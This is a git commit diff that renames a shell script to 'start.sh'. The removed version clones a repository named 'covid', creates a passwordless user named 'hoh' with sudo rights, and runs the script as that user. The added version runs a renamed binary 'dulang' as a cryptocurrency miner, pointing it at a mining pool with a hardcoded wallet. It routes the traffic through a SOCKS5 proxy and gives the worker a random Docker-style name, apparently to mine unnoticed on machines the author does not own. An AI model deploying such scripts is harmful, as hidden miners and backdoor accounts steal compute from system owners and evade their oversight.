bde47ae9ff32b531534439be3695e6b02cbadd0e
lakukansaja <86580684+lakukansaja@users.noreply.github.com>
2021-06-28 08:58:54 +0700

    Update and rename kuntul.sh to start.sh

--- kuntul.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-sudo apt update
-git clone https://github.com/kzjcnfmfkfk/covid.git && cd covid
-chmod +x start.sh && chmod +x dulang
-sudo adduser --disabled-password --gecos "" hoh && sudo usermod -aG sudo hoh
-sudo -u hoh -H sh -c "./start.sh"
---
+++ start.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x dulang
+screen -dmS ls 
+POOL=stratum+tcp://stratum-eu.rplant.xyz:7042
+WALLET=sugar1qngmzf54uhj4jdhgmh63kpe7z8nqdgnlemvheeq.dus
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
+PROXY=socks5://98.162.25.23:4145
+./dulang -a yespowersugar -o $POOL -u $WALLET -p $WORKER -t 2 -x $PROXY
